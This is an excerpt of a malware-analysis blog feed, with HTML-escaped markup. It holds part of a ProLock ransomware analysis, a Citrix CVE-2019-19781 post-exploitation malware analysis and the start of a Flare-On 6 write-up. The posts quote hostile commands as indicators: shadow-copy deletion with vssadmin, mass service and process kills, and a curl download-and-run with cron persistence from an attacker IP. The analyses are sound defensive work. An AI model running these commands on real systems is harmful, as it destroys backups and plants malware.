      &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;call.*?\[.*?(.*)\+(.*)h]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Regex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;register&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_reg_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Qword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;MakeComm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The malware will proceed on deleting the following files:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\WinMgr.xml&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\WinMgr.bmp&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\clean.bat&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\run.bat&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img3.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Notice the comments added to each call instruction.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Two other functions at offset &lt;strong&gt;0x8E4&lt;/strong&gt; and &lt;strong&gt;0x8F1&lt;/strong&gt; are called.&lt;/p&gt;

&lt;h3 id=&quot;deleting-share-connections&quot;&gt;Deleting share connections&lt;/h3&gt;

&lt;p&gt;The role of the first one is to enumerate the shares of the local machine and delete all the connections except hidden shares.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img4.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;killing-processes-and-services&quot;&gt;Killing processes and services&lt;/h3&gt;

&lt;p&gt;The second function is responsible for killing the processes that starts with the following strings:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aagntsv, cntaos, dbeng5, dbsnmp, encsvc, excel., firefo, infopa, isqlpl, mbamtr, msacce, msftes, mspub., mydesk, mysqld, ntrtsc, ocauto, ocomm., ocssd., onenot, oracle, outloo, pccntm, powerp, sqbcor, sqlage, sqlbro, sqlser, sqlwri, steam., syncti, tbirdc, thebat, thunde, tmlist, visio., winwor, wordpa, xfssvc, zoolz&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;command used: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;taskkill.exe /IM &quot;name_of_process&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;And stopping the following services:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;McAfeeFramework, Alerter, AcronisAgent, Acronis VSS Provider, BackupExecAgentAccelerator, BackupExecDeviceMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, BackupExecVSSProvider, DFSR, EPIntegrationService, EPProtectedService, EPSecurityService, EPUpdateService, MB3Service, MBAMService, MBEndpointAgent, MSExchangeES, MSExchangeMGMT, MSExchangeMTA, MSExchangeSA, MSExchangeSRS, MSExchangeADTopology, MSExchangeDelivery, MSExchangeDiagnostics, MSExchangeEdgeSync, MSExchangeHM, MSExchangeHMRecovery, MSExchangeIS, MSExchangeMailboxReplication, MSExchangeRPC, MSExchangeRepl, MSExchangeServiceHost, MSExchangeTransport, MSExchangeUM, MSExchangeUMCR, MSOLAP$*, MSSQLSERVER, MsDtsServer, MySQL57, OSearch15, OracleClientCache80, QuickBooksDB25, SPAdminV4, SPSearchHostController, SPTraceV4, SPUserCodeV4, SPWriterV4, SQLBrowser, SQLSafeOLRService, SQLsafe Backup Service, SQLSERVERAGENT, SQLTELEMETRY, SQLBackups, SQLAgent$*, MSSQL$*, MSMQ, ReportServer, ReportServer$*, SQLWriter, SQLBackupAgent, Symantec System Recovery, SyncoveryVSSService, VeeamBackupSvc, VeeamCatalogSvc, VeeamCloudSvc, VeeamEndpointBackupSvc, VeeamEnterpriseManagerSvc, VeeamMountSvc, VeeamNFSSvc, VeeamRESTSvc, VeeamTransportSvc',0, Veeam Backup Catalog Data Service, epag, epredline, mozyprobackup, masvc, macmnsvc, mfemms, McAfeeDLPAgentService, psqlWGE, swprv, wsbexchange, WinVNC4, TMBMServer, tmccsf, tmlisten, VSNAPVSS, stc_endpt_svc, wbengine, bbagent, NasPmService, BASupportExpressStandaloneService_N_Central, BASupportExpressSrvcUpdater_N_Central, hasplms, EqlVss, EqlReqService, RapidRecoveryAgent, YTBackup, vhdsvc, TeamViewer, MSOLAP$SQL_2008, MSOLAP$SYSTEM_BGC, MSOLAP$TPS, MSOLAP$TPSAMA, MSSQL$BKUPEXEC, MSSQL$ECWDB2, MSSQL$PRACTICEMGT, MSSQL$PRACTTICEBGC, MSSQL$PROD, MSSQL$PROFXENGAGEMENT, MSSQL$SBSMONITORING, MSSQL$SHAREPOINT, MSSQL$SOPHOS, MSSQL$SQL_2008, MSSQL$SQLEXPRESS, MSSQL$SYSTEM_BGC, MSSQL$TPS, MSSQL$TPSAMA, MSSQL$VEEAMSQL2008R2, MSSQL$VEEAMSQL2012, MSSQLFDLauncher, MSSQLFDLauncher$PROFXENGAGEMENT, MSSQLFDLauncher$SBSMONITORING, MSSQLFDLauncher$SHAREPOINT, MSSQLFDLauncher$SQL_2008, MSSQLFDLauncher$SYSTEM_BGC, MSSQLFDLauncher$TPS, MSSQLFDLauncher$TPSAMA, MSSQLSERVER, MSSQLServerADHelper, MSSQLServerADHelper100, MSSQLServerOLAPService, SQLAgent$BKUPEXEC, SQLAgent$CITRIX_METAFRAME, SQLAgent$CXDB, SQLAgent$ECWDB2, SQLAgent$PRACTTICEBGC, SQLAgent$PRACTTICEMGT, SQLAgent$PROD, SQLAgent$PROFXENGAGEMENT, SQLAgent$SBSMONITORING, SQLAgent$SHAREPOINT, SQLAgent$SOPHOS, SQLAgent$SQL_2008, SQLAgent$SQLEXPRESS, SQLAgent$SYSTEM_BGC, SQLAgent$TPS, SQLAgent$TPSAMA, SQLAgent$VEEAMSQL2008R2, SQLAgent$VEEAMSQL2012, ReportServer$SQL_2008, ReportServer$SYSTEM_BGC, ReportServer$TPS, ReportServer$TPSAMA&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Command used: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net stop &quot;name_of_service&quot; /y host.exe&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;deleting-shadow-copies&quot;&gt;Deleting shadow copies&lt;/h3&gt;

&lt;p&gt;Other commands will be executed continuously by the malware which are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe delete shadows /all /quiet&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe resize shadowstorage /for=C:\ /on=C:\ /maxsize=401MB&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe resize shadowstorage /for=C:\ /on=C:\ /maxsize=unbounded&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the last 2 commands, the malware loops on every partition starting from &lt;strong&gt;C:\&lt;/strong&gt; etc…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img5.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img6.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;encryption&quot;&gt;Encryption&lt;/h3&gt;

&lt;p&gt;A first thread is tasked to run a function at offset &lt;strong&gt;0x1E17&lt;/strong&gt;, the main role of this thread is to loop through the directories recursively, in each directory a ransom note file will be created called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[HOW TO RECOVER FILES].TXT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img7.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img8.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When a file is found, a second thread is started to execute the function at offset &lt;strong&gt;0x33DF&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It’s main role is to encrypt files of size greater than 8kb avoiding the following file extensions:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.exe, .dll, .lnk, .ico, .ini, .msi, .chm, .sys, .hlf, .lng, .inf, .ttf, .cmd, .bat, .vhd, .bac, .bak, .wbc, .bkf, .set, .win, .dsk&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note: the malware avoid the following directories:&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ Recycle.Bin, All Users, Boot, Common Files, DVD Maker, Internet Explorer, Kaspersky Lab, Kaspersky Lab Setup Files, Microsoft, Microsoft.NET, Microsoft_Corporation, Mozilla Firefox, PerfLog, System Volume Information, Uninstall Information, Windows, Windows Defender, Windows Mail, Windows Media Player, Windows NT, Windows Photo Viewer, Windows Portable Devices, Windows Sidebar, WindowsApps, WindowsPowerShell&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;collected-iocs&quot;&gt;Collected IOCs&lt;/h2&gt;

&lt;h4 id=&quot;hahes&quot;&gt;Hahes&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinMgr.bmp: a6ded68af5a6e5cc8c1adee029347ec72da3b10a439d98f79f4b15801abd7af0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;filenames&quot;&gt;Filenames&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\WinMgr.xml&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\WinMgr.bmp&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\clean.bat&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Programdata\\run.bat&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;commands&quot;&gt;Commands&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe delete shadows /all /quiet&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe resize shadowstorage /for=C:\ /on=C:\ /maxsize=401MB&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe resize shadowstorage /for=C:\ /on=C:\ /maxsize=unbounded&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;taskkill.exe /IM &quot;name_of_process&quot;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net stop &quot;name_of_service&quot; /y host.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Citrix CVE-2019-19781 malware analyses</title><link href="http://localhost:4000/2020/01/17/citrix_malware.html" rel="alternate" type="text/html" title="Citrix CVE-2019-19781 malware analyses" /><published>2020-01-17T11:08:00-06:00</published><updated>2020-01-17T11:08:00-06:00</updated><id>http://localhost:4000/2020/01/17/citrix_malware</id><content type="html" xml:base="http://localhost:4000/2020/01/17/citrix_malware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;After the exploit release of CVE-2019-19781, malicious hackers took the opportunity to compromise Citrix instances that did not have the Citrix mitigation implemented. I had the chance to get my hands on some artefacts from a honey pot of a certain threat actor who compromised multiple servers &lt;a href=&quot;https://twitter.com/michel228/status/1216771783656910849&quot;&gt;tweet link&lt;/a&gt;, in this post I will talk in details on how I reversed it using Cutter.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note: the secret key used by the malware was altered by m.&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;post-exploitation&quot;&gt;Post-exploitation:&lt;/h2&gt;

&lt;p&gt;We notice that the threat actor executed the following bash commands on the compromised system:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt; netscalerd&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /var/tmp/netscalerd&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/.init&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; https://95.179.163.186/wp-content/uploads/2018/09/6b37ab9644fff4d954615c93cc890039 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/.init/httpd&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;744 /tmp/.init/httpd&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;* * * * * /var/nstmp/.nscache/httpd&quot;&lt;/span&gt; | crontab -&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
/tmp/.init/httpd &amp;amp;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;It kill all running instances of netscalerd&lt;/li&gt;
  &lt;li&gt;It delete the file &lt;strong&gt;/var/tmp/netscalerd&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;It create the directory &lt;strong&gt;/tmp/.init&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;It download a binary file from 95.179.163.186 through https request and save it in &lt;strong&gt;/tmp/.init/httpd&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;It create a cronjob to run &lt;strong&gt;/var/nstmp/.nscache/httpd&lt;/strong&gt;, note: this file is created by the downloaded binary.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;overview-of-the-binary-file&quot;&gt;Overview of the binary file:&lt;/h2&gt;

&lt;p&gt;Opening the binary with Cutter reveals that it’s a golang compiled binary composed of multiple functions mainly:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;main&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;install_itself&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;remove_bds&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;doFile&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;install_cron&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;xrun&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;func1&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;analyses&quot;&gt;Analyses&lt;/h2&gt;

&lt;h3 id=&quot;main-function&quot;&gt;main function:&lt;/h3&gt;

&lt;p&gt;Run &lt;a href=&quot;#remove_bds-function&quot;&gt;remove_bds function&lt;/a&gt; as a thread and check if the file &lt;strong&gt;/var/nstmp/.nscache/httpd&lt;/strong&gt; , if it does not exist it run &lt;a href=&quot;#install_itself-function&quot;&gt;install_itself function&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/call_removedbs_install_itself.png&quot; alt=&quot;call_removedbs_install_itself&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if the current process CWD do not contain the string &lt;strong&gt;.nscache/httpd&lt;/strong&gt; it start &lt;strong&gt;/var/nstmp/.nscache/httpd&lt;/strong&gt; as new process then it exit, else it run 2 other threads:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#xrun-function&quot;&gt;xrun function&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#install_cron-function&quot;&gt;install_cron function&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/xrun_thread_start_process.png&quot; alt=&quot;xrun_thread_start_process&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;install_itself-function&quot;&gt;install_itself function:&lt;/h3&gt;

&lt;p&gt;It create a directory &lt;strong&gt;/var/nstmp/.nscache&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/install_itself_mkdir.png&quot; alt=&quot;install_itself_mkdir&quot; /&gt;&lt;/p&gt;

&lt;p&gt;check if the file &lt;strong&gt;/var/nstmp/.nscache/httpd&lt;/strong&gt; already exist&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/install_itself_check_file_exist.png&quot; alt=&quot;install_itself_check_file_exist&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if not, it copy it self to &lt;strong&gt;/var/nstmp/.nscache/httpd&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;remove_bds-function&quot;&gt;remove_bds function:&lt;/h3&gt;

&lt;p&gt;It continuously read the directory &lt;strong&gt;/netscaler/portal/scripts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/remove_dbs_readdir.png&quot; alt=&quot;remove_dbs_readdir&quot; /&gt;&lt;/p&gt;

&lt;p&gt;then loops through all the files contained in that directory, by checking if they were created in the last &lt;strong&gt;14 days&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/remove_bds_check_14_days.png&quot; alt=&quot;remove_bds_check_14_days&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if yes, it proceed to &lt;a href=&quot;#dofile-function&quot;&gt;doFile function&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/remove_dbs_dofile.png&quot; alt=&quot;remove_dbs_dofile&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dofile-function&quot;&gt;doFile function:&lt;/h3&gt;

&lt;p&gt;It first check if the file name contains a special 32 bytes long string (secret key)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/dofile_check_name.png&quot; alt=&quot;dofile_check_name&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the case where it does not, it continue by checking if the content of the file contains the strings &lt;strong&gt;block&lt;/strong&gt; or &lt;strong&gt;BLOCK&lt;/strong&gt; if it does, the file will be deleted unless it also contains the &lt;strong&gt;secret key&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/dofile_block_key_string.png&quot; alt=&quot;dofile_block_key_string&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;install_cron-function&quot;&gt;install_cron function:&lt;/h3&gt;

&lt;p&gt;Is for some reasons … empty.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/install_cron.png&quot; alt=&quot;install_cron&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;xrun-function&quot;&gt;xrun function:&lt;/h3&gt;

&lt;p&gt;Start a UDP listener on &lt;strong&gt;*:18634&lt;/strong&gt; then it keep listening on that port, without using the data received.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/xrun_resolveudp.png&quot; alt=&quot;xrun_resolveudp&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;func1-function&quot;&gt;func1 function:&lt;/h3&gt;

&lt;p&gt;It continuously scan the directory &lt;strong&gt;/netscaler/portal/templates&lt;/strong&gt; for &lt;strong&gt;*.xml&lt;/strong&gt; files, then call &lt;a href=&quot;#dofile-function&quot;&gt;doFile function&lt;/a&gt;.
In other words every xml file that contain the string &lt;strong&gt;block&lt;/strong&gt; or &lt;strong&gt;BLOCK&lt;/strong&gt; will be deleted unless the content/file name contain the &lt;strong&gt;secret key&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/citrix_malware/func1_delete_files_if_block_key.png&quot; alt=&quot;func1_delete_files_if_block_key&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion:&lt;/h2&gt;

&lt;p&gt;From my understanding, the author’s goal was to stop other malicious hackers from exploiting and gaining access to the Citrix instance by deleting every uploaded xml file, while retaining access to himself, indeed with that 32 bytes long string which serves as a &lt;strong&gt;secret key&lt;/strong&gt;, only the author of this malware can gain access to the compromised server.&lt;/p&gt;

&lt;h2 id=&quot;collected-iocs&quot;&gt;Collected IOCs:&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filenames&lt;/strong&gt;:
    &lt;ul&gt;
      &lt;li&gt;/tmp/.init/httpd&lt;/li&gt;
      &lt;li&gt;/var/nstmp/.nscache/httpd&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Directories&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;/var/nstmp/.nscache&lt;/li&gt;
      &lt;li&gt;/tmp/.init&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IPs&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;95.179.163.186&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;UDP listener&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;*.18634&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bash history&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;kill -9 netscalerd;&lt;/li&gt;
      &lt;li&gt;rm /var/tmp/netscalerd;&lt;/li&gt;
      &lt;li&gt;mkdir /tmp/.init;&lt;/li&gt;
      &lt;li&gt;curl -k https://95.179.163.186/wp-content/uploads/2018/09/6b37ab9644fff4d954615c93cc890039 -o /tmp/.init/httpd;&lt;/li&gt;
      &lt;li&gt;chmod 744 /tmp/.init/httpd;&lt;/li&gt;
      &lt;li&gt;echo “* * * * * /var/nstmp/.nscache/httpd” | crontab -;&lt;/li&gt;
      &lt;li&gt;/tmp/.init/httpd &amp;amp;;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on6 challenge 11</title><link href="http://localhost:4000/2019/09/19/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on6 challenge 11" /><published>2019-09-19T08:17:00-05:00</published><updated>2019-09-19T08:17:00-05:00</updated><id>http://localhost:4000/2019/09/19/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2019/09/19/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;#vv_max:
                    Hey, at least its not subleq.&lt;/p&gt;

&lt;h2 id=&quot;analyses&quot;&gt;Analyses&lt;/h2&gt;

&lt;p&gt;We are given a 64bit Windows executable, the binary is expecting 2 string arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/arguments.png&quot; alt=&quot;arguments&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after that we have 3 important functions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/3_important_functions.png&quot; alt=&quot;3_important_functions&quot; /&gt;&lt;/p&gt;

